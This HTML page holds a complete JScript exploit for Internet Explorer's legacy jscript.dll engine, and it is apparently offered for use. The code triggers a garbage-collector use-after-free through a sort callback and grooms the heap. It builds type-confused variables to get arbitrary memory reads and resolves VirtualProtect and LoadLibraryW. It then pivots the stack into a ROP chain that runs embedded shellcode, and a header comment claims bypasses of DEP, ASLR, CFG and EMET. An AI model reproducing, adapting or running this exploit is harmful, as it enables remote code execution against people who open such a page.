<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

/*

Bypasses: DEP, ASLR, CFG, EMET (EAF, EAF+, stack pivot protection)

*/


var EnableDebug = 0;
var Shellcode = [ 0x68e58960, 0x000d4e88, 0x000053e8, 0x57866800, 0xe850000d, 0x00000094, 0x00323368, 0x73556800, 0xff547265, 0xb81a68d0, 0xe8500006, 0x0000007c, 0x7068646a, 0x89656e77, 0x656e68e1, 0x6f680074, 0x682e7272, 0x2d747365, 0x726f6668, 0x77776872, 0xe2892e77, 0x5152006a, 0xd0ff006a, 0xc361ec89, 0x57e58955, 0x0030be56, 0xad640000, 0x8b0c408b, 0xfe891878, 0x04ebc031, 0x2874f739, 0x2474f685, 0x85245e8d, 0x8b1474db, 0xc985044b, 0x016a0d74, 0x015de851, 0x453b0000, 0x31067408, 0xeb368bc0, 0x10468bd7, 0xec895f5e, 0x0004c25d, 0x81e58955, 0x000230ec, 0x08458b00, 0x8bf84589, 0x4203f855, 0x04c0833c, 0x83f04589, 0x458914c0, 0x8bc289f4, 0x42030845, 0x644a8b60, 0x89d04d89, 0xc289fc45, 0x0308458b, 0x45892042, 0xfc558bec, 0x0308458b, 0x45892442, 0xfc558be4, 0x0308458b, 0x45891c42, 0x89c031e8, 0x4589e045, 0xfc458bd8, 0x3b18408b, 0x860fe045, 0x000000d2, 0x8de0458b, 0x0000850c, 0x558b0000, 0x08458bec, 0x89110403, 0x006ad445, 0x00bde850, 0x453b0000, 0xa1850f0c, 0x8b000000, 0x148de045, 0xe4458b00, 0x0204b70f, 0x00850c8d, 0x8b000000, 0x458be855, 0x11040308, 0x8bd84589, 0xca89fc4d, 0x39d05503, 0x397f7cc8, 0xc77b7dd0, 0x0000d845, 0xc9310000, 0xfdd09d8d, 0x148affff, 0x00fa8008, 0xfa802074, 0xc715752e, 0x6c642e03, 0x04c3836c, 0x8d0003c6, 0xfffed09d, 0xdeeb41ff, 0x43411388, 0x03c6d8eb, 0xd09d8d00, 0x6afffffd, 0x3ce85300, 0x50000000, 0xfffea3e8, 0x74c085ff, 0xdc458929, 0x958d006a, 0xfffffed0, 0x0021e852, 0xff500000, 0xd1e8dc75, 0x89fffffe, 0x0aebd845, 0xffe0458d, 0xff1fe900, 0x458bffff, 0x5dec89d8, 0x550008c2, 0x8b57e589, 0x7d8b084d, 0x80db310c, 0x14740039, 0x0c01b60f, 0xd0b60f60, 0xe3d1d301, 0x74ff8541, 0xe7eb41ea, 0x895fd889, 0x08c25dec, 0x00650000, ];
function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00,
          ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF,
          NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
   return String.fromCharCode.apply(null, Data);
}
  
var UntrackedVarCount = 300;
var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 20000;

var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method

function GlitchedSort(untracked_1, untracked_2) { // goes to depth of 227 before freeing GcBlocks, which only happens once.
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
	
    if(SortDepth > 250) {
        VarSpray = new Array(); // Erase VarSpray
        CollectGarbage(); // Free the GcBlocks
		//DebugLog("GcBlock free/final iteration called on depth " + SortDepth.toString(8) + " adding 2 new untracked to existing array of " + UntrackedVarSet.length.toString(8));
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    //DebugLog("sort called on depth " + SortDepth.toString(8) + "adding 2 new untracked to existing array of " + UntrackedVarSet.length.toString(8));
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
	//DebugLog("sort end on depth " + SortDepth.toString(8) + "adding 2 new untracked to existing array of " + UntrackedVarSet.length.toString(8));
    return 0;
}

function NewUntrackedVarSet(Count) {
	SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(379).join('A');

function ReClaimIndexNameList(AnchorIndex, Value, PropertyName) {
	CollectGarbage(); // Cleanup
	AnchorObjectsBackup[AnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
	CollectGarbage(); // Free the leaked NameList
	AnchorObjectsBackup[AnchorIndex] = new Object();
	AnchorObjectsBackup[AnchorIndex][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
	AnchorObjectsBackup[AnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
	AnchorObjectsBackup[AnchorIndex]["\u0003"] = 1;
	AnchorObjectsBackup[AnchorIndex][PropertyName] = Value; // The mutable variable
}

function ReClaimBackupNameLists(AnchorIndex, Value, PropertyName) { // This function is assuming the leaked anchor index is within the range being freed/re-allocated
	CollectGarbage(); // Cleanup
	for(i = 0; i < NameListAnchorCount; i++) AnchorObjectsBackup[i] = null;//NameListAnchorCount
	CollectGarbage(); // Free the leaked NameList
	
	for(i = 0; i < NameListAnchorCount; i++) {
		AnchorObjectsBackup[i] = new Object();
		AnchorObjectsBackup[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
		AnchorObjectsBackup[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
		AnchorObjectsBackup[i]["\u0003"] = 1;
		AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
	}
}

var MutableVar;

function LeakByte(Address) {
    ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord(Address) {
    ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword(Address) {
    ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
	ReClaimIndexNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimIndexNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LeakDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
}

function DiveModuleBase(Address) {
    var Base = (Address & 0xFFFF0000) + 0x4e; // Set to starting search point
	
    while(true) {
        if(LeakDword(Base) == 0x73696854) { // The string 'This'
            Base -= 0x4e; // Subtract the offset to get the base
            return Base;
        }
		
        Base -= 0x10000;
    }
	
	return 0;
}

function Exploit() {
	// Initialization
	
	for(i = 0; i < 410; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method
	var LFHBlocks = new Array();

	// Trigger LFH for a size of 0x648

	for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
	
	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount); // Consistently 460 total
	DebugLog("total untracked: " + UntrackedVarSet.length.toString(8));
	// Re-claim with type confusion NameLists
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
		NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
		NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
		NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
	}
	
	// Leak final VVAL address from one of the NameLists
	
	AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    
	var LeakedVvalAddress = 0;
	
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
			break;
        }
    }

	if(LeakedVvalAddress != 0) {
		DebugLog("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
		var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

		for(i=0; i < 46; i++) {
			PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0);
		}
		
		while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

		// New set of untracked vars in freed GcBlock
		
		NewUntrackedVarSet(UntrackedVarCount);
		
		// Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
		
		for(i = 0; i < NameListAnchorCount; i++) {
			NameListAnchors[i][PrimaryVvalPropName] = 1;
		}
		
		// Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
		
		var LeakedVvalVar;

		for(i = 0; i < UntrackedVarSet.length; i++) {
			if(typeof UntrackedVarSet[i] === "number") {
				LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
				LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
				break;
			}
		}
		
		DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
		
		// Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
		
		ReClaimIndexNameList(LeakedAnchorIndex, 0x11, "A");
		
		if(LeakedVvalVar + "" == 0x11) {
			DebugLog("Leaked anchor object re-claim verification success");
			// Create the mutable variable which will be used throughout the remainder of the exploit
		
			ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x22, 0));
			
			var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

			for(i=0; i < 46; i++) {
				PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); // +0x30 is the offset to property name field of 32-bit VVAL struct
			}
			
			while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a
			
			// New set of untracked vars in freed GcBlock
			
			NewUntrackedVarSet(UntrackedVarCount);
			
			// Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
			
			for(i = 0; i < NameListAnchorCount; i++) {
				NameListAnchors[i][PrimaryVvalPropName] = 1;
			}

			for(i = 0; i < UntrackedVarSet.length; i++) {
				if(typeof UntrackedVarSet[i] === "number") {
					if(UntrackedVarSet[i] + "" == 0x22) {
						MutableVar = UntrackedVarSet[i];
						break;
					}
				}
			}
			
			// Verify the mutable var can be changed via simple re-claim
			
			ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x33, 0));
			
			if(MutableVar + "" == 0x33) {
				// Test arbitrary read primitive
				
				DebugLog("Verified mutable variable modification via re-claim");
				
				if(LeakByte(LeakedVvalAddress + 0x30) == 0x8) { // Change mutable var to a BSTR pointing at itself.
					// Derive jscript.dll base from leaked Object vtable
				
					DebugLog("Memory leak test successful");
					
					var DissectedObj = new Object();
					var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, DissectedObj);
					var VtableAddress = LeakDword(ObjectAddress);
					
					DebugLog("Leaked vtable address: " + VtableAddress.toString(16));
					
					var JScriptBase = DiveModuleBase(VtableAddress);
					
					if(JScriptBase != 0) {
						// Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
						
						DebugLog("Leaked JScript base address: " + JScriptBase.toString(16));
						
						var Kernel32ImportX = ExtractBaseFromImports(JScriptBase, 0x4e52454b, 0x32334c45);
						var Kernel32Base = DiveModuleBase(Kernel32ImportX);
						
						if(Kernel32Base != 0) {
							DebugLog("Successfully resolved kernel32.dll base at 0x" + Kernel32Base.toString(16));
							
							var VirtualProtectAddress = ResolveExport(Kernel32Base, 0x74726956, 0x506c6175, 0, 0); // 'triV' 'Plau' 
							
							if(VirtualProtectAddress != 0) {
								DebugLog("Successfully resolved VirtualProtect at 0x" + VirtualProtectAddress.toString(16));
								
								var LoadLibraryAddress = ResolveExport(Kernel32Base, 0x64616f4c, 0x7262694c, 0x57797261, 0); // 'daoL' rbiL' 'Wyra'

								if(LoadLibraryAddress != 0) {
									DebugLog("Successfully resolved LoadLibraryW at 0x" + LoadLibraryAddress.toString(16));
									
									// Load C:\Windows\SysWOW64\vbajet32.dll (non-ASLR/non-CFG module on Windows 7, 8.1 and 10)
									
									var DllPathStr = "vbajet32.dll";
									var DllPathAddreess = LeakObjectAddress(LeakedVvalAddress, DllPathStr);
									
									//var HijackArray = new Uint8Array(new ArrayBuffer(0x100));
									var HijackArray = new Array();

									//var HijackArrayAddress = LeakObjectAddress(LeakedVvalAddress, HijackArray);
										ReClaimIndexNameList(LeakedAnchorIndex, HijackArray, CreateVar32(0x8, LeakedVvalAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
				var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
				ReClaimIndexNameList(LeakedAnchorIndex, HijackArray, CreateVar32(0x8, LeakedVvalAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
				var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
									var HijackArrayVarObjPtr = (LowWord + (HighWord << 16));
									//DebugLog("Array VAR at " + LeakedVvalAddress.toString(16));
									//DebugLog("Array VAR object pointer " + HijackArrayVarObjPtr.toString(16));
									
									var HijackArrayTrueObj = LeakDword(HijackArrayVarObjPtr + 8);
									//DebugLog("Array true object at " + HijackArrayTrueObj.toString(16));
									
									var HijackArrayVtable = LeakDword(HijackArrayTrueObj);
									
									//DebugLog("BP ropnop at " + RopNop.toString(16));
									DebugLog("Array vtable at " + HijackArrayVtable.toString(16));
									DebugLog("Dll path address at " + DllPathAddreess.toString(16));
									//DllPathAddreess in HijackArray;
									
									// Hijack EIP via the typeof method of the artificial VAR within the leaked VVAL property name: msvbvm60.dll is non-ASLR/non-CFG on Windows 7-10. Temporarily, I am using a stack pivot from jscript.dll
									var ShellcodeStr = TableToUnicode(Shellcode);
									ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length);
									var ShellcodeAddress = LeakObjectAddress(LeakedVvalAddress, ShellcodeStr);
									var FakeVtablePaddingSize = 0x10000; // 64KB should be plenty to accomodate stack usage within shellcode
									var WritableStr = "AAAA"; // 8 bytes total needed
									var WritableAddress = LeakObjectAddress(LeakedVvalAddress, WritableStr);
									var FakeVtable = CreateFakeVtable(FakeVtablePaddingSize, 0x200, VirtualProtectAddress, ShellcodeAddress, JScriptBase, WritableAddress); // Doing this in a separate function is crucial for the AddressOf primitive to work properly. Concatenated vars in the same scope end up as a linked list of VARs
									//var FakeVtable = CloneFakeVtable(HijackArrayVtable, 0x400);
									
									DebugLog("ShellcodeAddress address: " + ShellcodeAddress.toString(16));
									
									FakeVtable = FakeVtable.substr(0, FakeVtable.length); // Nice trick to fix the AddressOf primitive. VARs created with multiple concats of other VARs end up as a linked list of VARs

									// VAR in VVAL will be a type 0x80 to a type 0x81 VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll
									
									// Re-claim NameList with mutable var set to region AFTER its own VAR in property name (as type 0x81). At this location in property name (+8 because of Type from generated VAR) the "object pointer" of the additional VAR (the fake vtable address) should be pointing at fake vtable BSTR +4 (to skip length
									
									var FakeVtableAddress = (LeakObjectAddress(LeakedVvalAddress, FakeVtable) + FakeVtablePaddingSize);
									DebugLog("fake vtable address: " + FakeVtableAddress.toString(16));
									ReClaimIndexNameList(LeakedAnchorIndex, 0, CreateVar32(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar32(0, FakeVtableAddress, 0)); // Must be 0x81 not 0x80
									
									//DebugLog("done calling hasitem for array");
									//alert("Calling HasItem of MutableVar... using vtable: " + FakeVtableAddress.toString(16));
									//DllPathAddreess in MutableVar;
									alert("Executing stack pivot for DEP bypass");
									typeof MutableVar;
									alert("really done");
								}
								else {
									DebugLog("Failed to resolve LoadLibraryW as export of " + Kernel32Base.toString(16));
								}
							}
							else {
								alert("Failed to resolve VirtualProtect as export of " + Kernel32Base.toString(16));
							}
						}
						else {
							DebugLog("Failed to identify Kernel32.dll base address via import " + Kernel32ImportX.toString(16));
						}
					}
					else {
						DebugLog("Failed to leak JScript.dll base address");
					}
				}
				else {
					DebugLog("Memory leak test failed");
				}
			}
			else {
				DebugLog("Failed to verify mutable variable modification via re-claim");
			}
		}
		else {
			DebugLog("Failed to extract final VVAL index via re-claim");
		}
	}
	else {
		DebugLog("Leaked anchor object type confusion re-claim failed");
	}
}

function DebugLog(Message) {
    if(EnableDebug) { // Switch is below
        try{
			alert(Message);
            //console.log(Message); // In IE, console only works if devtools is open.
        } catch(e) {
            try {
                //DebugLog(str_to_write); // A lot of popups but provides information.
            } catch(e) {
                // Otherwise, nothing.
            }
        }
    }
}

function CreateFakeVtable(FakeVtablePaddingSize, VtableSize, VirtualProtectAddress, ShellcodeAddress, JScriptBase, WritableAddress) {
	// [Padding]
	// [ROPNOP sled]
	// [Stack alignment gadget]
	// [Stack pivot]
	// [Set ECX to storage address]
	// [Save original ESP]
	// [VirtualProtect]
	// [Shellcode address] <- VirtualProtect return
	// [VirtualProtect parameters]
	// [Set EAX to storage address]
	// [Restore original ESP to EAX]
	// [Stack pivot]
	// [Padding]
	
	var FakeVtable = "";
	var X = 0;
	var Y = 0;
	var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
	
	var PushadGadget = (JScriptBase + Number(0x6b70D));
										// msvbvm60.dll - 0x7298b15a: xchg eax, esp; ret; - offset 0x4B15A
									// jscript.dll - 0x70369832: xchg eax, esp; ret; - offset 0x29832
									

									var RopNopGadget = (JScriptBase + Number(0x34553));
									var StackPivotGadget = (JScriptBase + Number(0x29832));
									var StackAlignment = (JScriptBase + Number(0x6b70D)); // POP ECX ; RET - 0x6b70C is POP ECX ; POP ECX ; RET
									// 0x7036b5bb: xchg eax, esi; ret; 
									// 0x703aa9b9: fstp xword ptr [ecx]; adc byte ptr [edi], cl; xchg eax, ebp; ret; - xchg eax, ebp ; ret (clean) is VERY common. Feasible for dynamic. - 0x6A9B9
									//var EspPreserve = (JScriptBase + Number(0x6A9BD));
									var SaveEspGadget = (JScriptBase + Number(0x45AE6)); // 0x70385ae6: mov dword ptr [ecx], eax; mov eax, 1; ret;
									var RestoreEspGadget = (JScriptBase + Number(0x16EE8)); // 0x70356ee8: mov eax, dword ptr [eax]; ret; - 0x16EE8
									var PopEaxGadget = (JScriptBase + Number(0x112EB));
									
	
	while (FakeVtable.length < TotalObjLen) {
		if(X < FakeVtablePaddingSize) {
			FakeVtable += ConvertDwordArrayToBytes([0x11111111]);
		}
		else {
			if(Y == 0x9c) {
				FakeVtable += ConvertDwordArrayToBytes([StackPivotGadget]);
			}
			else if(Y == 0x98) {
				FakeVtable += ConvertDwordArrayToBytes([StackAlignment]);
			}
			else if(Y == 0xA0) {
				FakeVtable += ConvertDwordArrayToBytes([StackAlignment]);
			}
			else if(Y == 0xA4) {
				FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
			}
			else if(Y == 0xA8) {
				FakeVtable += ConvertDwordArrayToBytes([SaveEspGadget]);
			}
			else {
				FakeVtable += ConvertDwordArrayToBytes([RopNopGadget]);
			}
			
			Y += 4;
		}
		
		X += 4;
	}
	
	FakeVtable += ConvertDwordArrayToBytes([VirtualProtectAddress]);
	FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
	FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
	FakeVtable += ConvertDwordArrayToBytes([0x5000]);
	FakeVtable += ConvertDwordArrayToBytes([0x40]);
	FakeVtable += ConvertDwordArrayToBytes([WritableAddress]);
	FakeVtable += ConvertDwordArrayToBytes([PopEaxGadget]);
	FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
	FakeVtable += ConvertDwordArrayToBytes([RestoreEspGadget]);
	FakeVtable += ConvertDwordArrayToBytes([StackPivotGadget]);
	
	TotalObjLen += (FakeVtablePaddingSize / 2);
	
	while (FakeVtable.length < TotalObjLen) {
		FakeVtable += ConvertDwordArrayToBytes([0x11111111]);
	}
	
	return FakeVtable;
}

function DwordToUnicode(Dword) {
	var Unicode = String.fromCharCode(Dword & 0xFFFF);
	Unicode += String.fromCharCode(Dword >> 16);
	return Unicode;
}

function TableToUnicode(Table) {
	var Unicode = "";
	
	for (i = 0; i < Table.length; i++) {
		Unicode += DwordToUnicode(Table[i]);
	}

	return Unicode;
}

function CloneFakeVtable(RealVtableAddress, Size) {
	var Obj = "";
	var x = 0;
	
	while (Obj.length < (Size / 2)) {
						if(x == 0x7c) {
						DebugLog("set special 0x7c method");
							Obj += ConvertDwordArrayToBytes([0x45454545]);
						}
						else {
							//var VtableEntry = LeakDword(RealVtableAddress + x);
							Obj += ConvertDwordArrayToBytes([0x22222222]);
						}
x += 4;
	}
	
	return Obj;
}

function ConvertDwordArrayToBytes(DwordArray) {
	var ByteArray = [];
	
	for (i = 0; i < DwordArray.length; i++) {
		ByteArray.push(DwordArray[i] & 0xffff);
		ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
	}
	
	return String.fromCharCode.apply(null, ByteArray);
}

/*

+0x0 is OriginalFirstThunk which is the RVA to the INT. If its zero, use the IAT at 0x10.

The INT is an array of IMAGE_THUNK_DATA structs

IMAGE_THUNK_DATA is just a DWORD (union). It can be a name RVA in the case of the INT, or a function RVA or ordinal in the IAT

typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString;      // PBYTE 
        DWORD Function;             // PDWORD
        DWORD Ordinal;
        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA32;
typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;

if (pCurrentNameImpThunk->u1.AddressOfData & IMAGE_ORDINAL_FLAG) {
							uint16_t wOrdinal = IMAGE_ORDINAL(pCurrentNameImpThunk->u1.AddressOfData);
							uint64_t qwFuncAddress = (uint64_t)GetProcAddress(hCurrentImpMod, (LPCSTR)wOrdinal);

							NtStatus = DynamicApis->NtProtectVirtualMemory(GetCurrentProcess(), &pRegionAddress, &cbRegionSize, PAGE_READWRITE, reinterpret_cast<PDWORD>(&dwOldProtect));

							if (NT_SUCCESS(NtStatus)) {
								pCurrentIatImpThunk->u1.Function = qwFuncAddress; // Patch IAT by resolving function address via ordinal. GetProcAddress will treat the string pointer as such. From MSN: "The function or variable name, or the function's ordinal value. If this parameter is an ordinal value, it must be in the low-order word; the high-order word must be zero."
								DynamicApis->NtProtectVirtualMemory(GetCurrentProcess(), &pRegionAddress, &cbRegionSize, dwOldProtect, reinterpret_cast<PDWORD>(&dwOldProtect));
							}
						}
						else {
							uint16_t* pwHint = static_cast<uint16_t*>(TargetPe->AddressFromRva(pCurrentNameImpThunk->u1.AddressOfData));
							const char* pFunctionName = (const char*)((uint8_t*)pwHint + sizeof(uint16_t)); // ANSI function name string comes after the hint WORD
							uint64_t qwFuncAddress = (uint64_t)GetProcAddress(hCurrentImpMod, pFunctionName);

							NtStatus = DynamicApis->NtProtectVirtualMemory(GetCurrentProcess(), &pRegionAddress, &cbRegionSize, PAGE_READWRITE, reinterpret_cast<PDWORD>(&dwOldProtect));

							if (NT_SUCCESS(NtStatus)) {
								pCurrentIatImpThunk->u1.Function = qwFuncAddress; // Resolve the address of the imported function and patch it into the IAT of the virtually mapped PE image in memory.
								DynamicApis->NtProtectVirtualMemory(GetCurrentProcess(), &pRegionAddress, &cbRegionSize, dwOldProtect, reinterpret_cast<PDWORD>(&dwOldProtect));
							}
						}
							
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

And finally for ordinals:

#define IMAGE_ORDINAL_FLAG64 0x8000000000000000
#define IMAGE_ORDINAL_FLAG32 0x80000000
#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)

So:
1. Loop dwords in INT
2. Check if they are ordinals or not
3. if not an ordinal then treat as RVA to IMAGE_IMPORT_BY_NAME
4. read name str from IMAGE_IMPORT_BY_NAME after word hint
*/


function ResolveImport(ModuleBase, TargetModuleNameLow, TargetModuleNameHigh, TargetFuncName1, TargetFuncName2, TargetFuncName3) {
	var ExtractedAddresss = 0;
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword(ImportDataDir);
    var ImportSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir
	var CurrentNameDesc = ModuleBase + ImportRva;
	
    while(ImportSize != 0) {
        NameField = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
		
        if(NameField != 0) {
			CurrentModuleNameLow = LeakDword(ModuleBase + NameField);
			CurrentModuleNameHigh = LeakDword(ModuleBase + NameField + 4);
			
			if(CurrentModuleNameLow == TargetModuleNameLow && CurrentModuleNameHigh == TargetModuleNameHigh) {
				// Always read the first 4 bytes of the name. If atleast one chunk has matched, and there have been no mismatches (unless the target chunk was given as 0) consider the import found.
				var ImportNameRva = LeakDword(CurrentNameDesc + 0xc);
				var ImportName1 = LeakDword(ModuleBase + ImportNameRva);
				
				if(TargetFuncName1 == ImportName1) {
					var ImportName2 = LeakDword(ModuleBase + ImportNameRva + 4);
					
					if(TargetFuncName2 != 0) {
						if(ImportName2 == TargetFuncName2) {
							var ThunkAddress = LeakDword(CurrentNameDesc + 0x10);
							ExtractedAddresss = LeakDword(ModuleBase + ThunkAddress);
						}
					}
				}
				
				break;
			}
			
			ImportSize -= 0x14;
			CurrentNameDesc += 0x14; // Next import descriptor in array
		}
		else {
			break;
		}
    }
	
	return ExtractedAddresss;
}

function ExtractBaseFromImports(ModuleBase, TargetModuleNameLow, TargetModuleNameHigh) { // Grab the first IAT entry of a function within the specified module (determined via the first 8 bytes of its name string)
	var ExtractedAddresss = 0;
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword(ImportDataDir);
    var ImportSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir
	var CurrentNameDesc = ModuleBase + ImportRva;
	
    while(ImportSize != 0) {
        NameField = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
		
        if(NameField != 0) {
			CurrentModuleNameLow = LeakDword(ModuleBase + NameField);
			CurrentModuleNameHigh = LeakDword(ModuleBase + NameField + 4);
			
			if(CurrentModuleNameLow == TargetModuleNameLow && CurrentModuleNameHigh == TargetModuleNameHigh) {
				ThunkAddress = LeakDword(CurrentNameDesc + 0x10);
				ExtractedAddresss = LeakDword(ModuleBase + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
				break;
			}
			
			ImportSize -= 0x14;
			CurrentNameDesc += 0x14; // Next import descriptor in array
		}
		else {
			break;
		}
    }
	
	return ExtractedAddresss;
}

